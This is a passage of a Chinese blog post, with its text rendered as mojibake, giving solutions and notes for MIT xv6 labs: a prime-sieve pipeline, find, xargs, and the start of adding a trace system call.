    send n to right neighbor<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªç”Ÿæˆè¿‡ç¨‹å¯ä»¥å°†æ•°å­—2ã€3ã€4ã€ â€¦ â€¦ 35è¾“å…¥ç®¡é“çš„å·¦ç«¯: ç®¡é“ä¸­çš„ç¬¬ä¸€ä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†2çš„å€æ•°ï¼Œç¬¬äºŒä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†3çš„å€æ•°ï¼Œç¬¬ä¸‰ä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†5çš„å€æ•°ï¼Œä¾æ­¤ç±»æ¨</p><blockquote><p><a href="https://swtch.com/~rsc/thread/">https://swtch.com/~rsc/thread/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230227125558.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *left_fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(left_fd[WRITE]);<br>    <span class="hljs-keyword">int</span> prime,i;<br>    read(left_fd[READ],&amp;prime,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//ç¬¬ä¸€ä¸ªæ•°å­—å¿…å®šæ˜¯ç´ æ•°</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>,prime);<span class="hljs-comment">//ç¬¦åˆæ ¼å¼çš„è¾“å‡º</span><br>    <br>    <span class="hljs-keyword">if</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">int</span> right_fd[<span class="hljs-number">2</span>];<br>        pipe(right_fd);<br>        <span class="hljs-keyword">int</span> pid=fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            foo(right_fd);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            close(right_fd[READ]);<br>            <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<span class="hljs-comment">//æ³¨æ„å·²ç»è¯»å–äº†ä¸€ä¸ªiï¼Œè¿™é‡Œè¦åˆ¤æ–­ä¸€ä¸‹</span><br>            &#123;<br>                write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>            &#125;<br>            <span class="hljs-keyword">while</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<br>                &#123;<br>                    write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>                &#125;<br>            &#125;<br>            close(right_fd[WRITE]);<br>            close(left_fd[READ]);<br>            wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//çˆ¶è¿›ç¨‹è¦ç­‰å¾…å­è¿›ç¨‹</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left_fd[<span class="hljs-number">2</span>];<br>    pipe(left_fd);<br>    <br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<span class="hljs-comment">//child</span><br>    &#123;<br>        foo(left_fd);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        close(left_fd[READ]);<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">35</span>;i++)<span class="hljs-comment">//ç¬¬ä¸€è½®ï¼ŒæŠŠ2~35å…¨éƒ½ä¼ é€’ç»™å³è¾¹</span><br>        &#123;<br>            write(left_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        &#125;<br>        close(left_fd[WRITE]);<br>        wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//ä¸»è¦çš„ç´ æ•°è¿›ç¨‹åº”è¯¥åªæœ‰åœ¨æ‰€æœ‰çš„è¾“å‡ºéƒ½æ‰“å°å‡ºæ¥ä¹‹åï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰å…¶ä»–çš„ç´ æ•°è¿›ç¨‹éƒ½é€€å‡ºä¹‹åæ‰èƒ½é€€å‡º</span><br>    &#125;<br>    <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>Write a simple version of the UNIX find program: find all the files in a directory tree whose name matches a string. Your solution should be in the file <code>user/find.c</code>.</p><ul><li>åŠŸèƒ½ï¼šæŸ¥æ‰¾ç›®å½•æ ‘ä¸­åç§°ä¸å­—ç¬¦ä¸²åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶</li><li>å¯ä»¥å‚è€ƒuser/ls.c ä»¥äº†è§£å¦‚ä½•è¯»å–ç›®å½•</li><li>é¿å¼€<code>.</code>å’Œ<code>..</code>çš„é€’å½’</li></ul><p>æ€è·¯ï¼š</p><p>æ‰“å¼€ç›®å½•ï¼Œä½¿ç”¨whileå¾ªç¯å¾—åˆ°ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶/å­ç›®å½•çš„direntç»“æ„ä½“de</p><ul><li>å¦‚æœæ˜¯de.nameæ˜¯.æˆ–è€…..ï¼Œé‚£ä¹ˆç›´æ¥continueè·³è¿‡</li><li>å¦‚æœä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥è·å–æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„buf<ul><li>å¦‚æœbufçš„stç±»å‹æ˜¯æ–‡ä»¶ç±»å‹ï¼Œä¸”æ–‡ä»¶åå­—å’Œæˆ‘ä»¬éœ€è¦æœç´¢çš„æ–‡ä»¶åå­—ç›¸åŒï¼Œé‚£ä¹ˆå°±ç›´æ¥è¾“å‡ºæ–‡ä»¶ä¿¡æ¯ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æ–‡ä»¶</li><li>å¦‚æœbufçš„stç±»å‹æ˜¯ç›®å½•ï¼Œä¸”ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ç»§ç»­é€’å½’æœç´¢ä¸‹å»</li></ul></li></ul><blockquote><p>æ¶‰åŠåˆ°readã€fstatç­‰å‡½æ•°çš„ä½¿ç”¨</p><p>æ¶‰åŠåˆ°direntã€statç»“æ„ä½“çš„ä½¿ç”¨</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * path,<span class="hljs-keyword">char</span> *file)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>], *p;<br><br>    <span class="hljs-keyword">if</span>((fd = open(path, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//æ‰“å¼€ç›®å½•ï¼Œè·å¾—å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot open %s\n&quot;</span>, path);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, path);<br>        close(fd);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de))<span class="hljs-comment">//ä½¿ç”¨whileå¾ªç¯å¾—åˆ°ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶/å­ç›®å½•çš„direntç»“æ„ä½“de</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;.&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;..&quot;</span>)==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//è·³è¿‡</span><br>        <br>        <span class="hljs-built_in">strcpy</span>(buf, path);<br>        p = buf+<span class="hljs-built_in">strlen</span>(buf);<br>        *p++ = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">char</span> *pp=de.name;<br>        <span class="hljs-keyword">while</span>(*pp!=<span class="hljs-number">0</span>) <span class="hljs-comment">//å­—ç¬¦ä¸²æ‹¼æ¥</span><br>        &#123;<br>            *p++ =*pp++;<br>        &#125;<br>        *p=<span class="hljs-number">0</span>;<span class="hljs-comment">//åˆ«å¿˜äº†åŠ ç»ˆæ­¢ç¬¦</span><br>        <br>        <span class="hljs-keyword">if</span>(stat(buf, &amp;st) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//è·å–bufçš„st</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.type==T_FILE)<span class="hljs-comment">//å¦‚æœbufçš„stç±»å‹æ˜¯æ–‡ä»¶ç±»å‹</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,file)==<span class="hljs-number">0</span>)<span class="hljs-comment">//å¦‚æœæ–‡ä»¶åå­—å’Œæˆ‘ä»¬éœ€è¦æœç´¢çš„æ–‡ä»¶åå­—ç›¸åŒï¼Œé‚£ä¹ˆå°±ç›´æ¥è¾“å‡ºæ–‡ä»¶ä¿¡æ¯</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(st.type==T_DIR)<span class="hljs-comment">//å¦‚æœbufçš„stç±»å‹æ˜¯ç›®å½•ç±»å‹</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-comment">//ç›®å½•ä¸‹æ²¡æœ‰æ–‡ä»¶ï¼Œå¦‚æœç¼ºå°‘è¿™ä¸ªè¯­å¥xargså‘½ä»¤å°†ä¼šæŠ¥é”™</span><br>    <span class="hljs-keyword">continue</span>;<br>            find(buf,file);<span class="hljs-comment">//é€’å½’ï¼Œç»§ç»­æœç´¢</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * path=argv[<span class="hljs-number">1</span>];<span class="hljs-comment">//æŸ¥æ‰¾ç›®å½•</span><br>    <span class="hljs-keyword">char</span> * file=argv[<span class="hljs-number">2</span>];<span class="hljs-comment">//æŸ¥æ‰¾æ–‡ä»¶</span><br><br>    find(path,file);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><p>Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file <code>user/xargs.c</code>.</p><ul><li>å¯¹äºç®¡é“è¿æ¥çš„å‘½ä»¤ï¼Œä»¥<code>find . b | xargs grep hello</code>ä¸ºä¾‹ï¼Œargv[0]æ˜¯ xargsï¼Œargv[1]æ˜¯grepï¼Œä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæƒ³è¦è¯»å–find . bï¼Œé‚£ä¹ˆéœ€è¦ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ï¼Œä¹Ÿå³æ˜¯ä½¿ç”¨readå‡½æ•°è¯»å–fdä¸º0æ—¶çš„æ•°æ®</li><li>æ¯ä¸€æ¬¡è¯»å–ä¸€è¡Œï¼Œå°†è¯¥è¡Œæ‰€æœ‰ç©ºæ ¼æ›¿æ¢ä¸º\0ï¼Œè¿™æ ·å‘½ä»¤å°±å¯ä»¥è¢«åˆ†å‰²ã€‚ç„¶åå°†argv[]æŒ‡å‘è¿™äº›å‘½ä»¤ã€‚å¦‚æœé‡åˆ°æ¢è¡Œç¬¦ï¼Œæ‰§è¡Œforkï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN 0</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> *Argv[MAXARG];<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=argc<span class="hljs-number">-1</span>;i++)<br>    &#123;<br>        Argv[i<span class="hljs-number">-1</span>]=argv[i];<span class="hljs-comment">//ignore xargs(argv[0])</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        index=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">char</span> *p=buf;<br>        i=argc<span class="hljs-number">-1</span>;<span class="hljs-comment">//æ³¨æ„iè¦å†™åœ¨è¿™é‡Œ</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> num=read(STDIN,&amp;c,<span class="hljs-number">1</span>);<span class="hljs-comment">//è¯»å–æ ‡å‡†è¾“å…¥,æ³¨æ„æ˜¯&amp;c</span><br>            <span class="hljs-keyword">if</span>(num!=<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//ç¨‹åºçš„ç»ˆæ­¢æ¡ä»¶</span><br>            <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27; &#x27;</span>||c==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            &#123;<br>                buf[index++]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>                Argv[i++]=p;<span class="hljs-comment">//å‚æ•°</span><br>                p=&amp;buf[index];<span class="hljs-comment">//æ›´æ–°å‚æ•°é¦–åœ°å€</span><br>                <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;\n&#x27;</span>) <br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//character </span><br>            &#123;<br>                buf[index++]=c;<br>            &#125;<br>        &#125;<br>        Argv[i]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            exec(Argv[<span class="hljs-number">0</span>],Argv);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            wait(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230301002218.png"></p><h1 id="Lab2-syscall-System-calls"><a href="#Lab2-syscall-System-calls" class="headerlink" title="Lab2 syscall System calls"></a>Lab2 syscall System calls</h1><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><blockquote><p>å»ºè®®å¬è¯¾+ç†Ÿè¯»xv6æ‰‹å†Œï¼Œå¹¶ç†è§£æ¸…æ¥šlabè¦æ±‚</p></blockquote><p>å…ˆåˆ‡æ¢åˆ°syscallåˆ†æ”¯ï¼Œå¹¶åœ¨sh.cä¸­åŠ å…¥ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é€’å½’é”™</p><p>è¿™ä¸ªå®éªŒè¦æ±‚æˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆææ¸…æ¥šriscvæ¶æ„çš„ç³»ç»Ÿè°ƒç”¨æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E6%88%AA%E5%9B%BE20230302004808.png"></p><p>ç”¨æˆ·æ‰§è¡Œtraceå‘½ä»¤ - &gt; ecall <code>&lt;SYS_trace&gt;</code>  - &gt; è§¦å‘trap - &gt; è°ƒç”¨sys_trace</p><p>æ¥è‡ªç”¨æˆ·ç©ºé—´çš„ç³»ç»Ÿè°ƒç”¨ã€ä¸­æ–­ã€å¼‚å¸¸éƒ½å¯ä»¥å¼•å‘trapï¼Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„trapçš„å¤„ç†è·¯å¾„æ˜¯ï¼š</p><ul><li>uservec(kernel/trampoline.S:16)</li><li>usertrap(kernel/trap.c:37)</li><li>usertrapret(kernel/trap.c:90) è¿”å›æ—¶</li><li>userret(kernel/trampoline.S:16)</li></ul><p>è¯¦ç»†çš„å†…å®¹è§xv6æ–‡æ¡£</p><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>ä¸ºäº†æ·»åŠ traceç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ul><li>åœ¨Makefileä¸­æ·»åŠ $U/_traceï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç¼–è¯‘å‡ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»è€Œåœ¨ç”¨æˆ·å‘½ä»¤è¡Œä¸­è°ƒç”¨traceå‘½ä»¤</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_trace<br></code></pre></td></tr></table></figure><ul><li>å°†traceç³»ç»Ÿè°ƒç”¨çš„åŸå‹æ·»åŠ åˆ° <code>user/user.h</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">trace</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>traceçš„stubæ·»åŠ åˆ° <code>user/usys.pl</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">entry(<span class="hljs-string">&quot;trace&quot;</span>);<br></code></pre></td></tr></table></figure><p>usys.plæ–‡ä»¶ä¼šç”Ÿæˆ<em>usys.S</em>æ–‡ä»¶ï¼Œå½¢å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/syscall.h&quot;</span></span><br>.global trace<br>trace:<br> li a7, SYS_trace<br> ecall<br> ret<br></code></pre></td></tr></table></figure><ul><li>åœ¨syscall.hä¸­æ·»åŠ traceçš„ç³»ç»Ÿè°ƒç”¨å·</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_trace  22</span><br></code></pre></td></tr></table></figure><ul><li>åœ¨syscall.cä¸­æ·»åŠ </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span 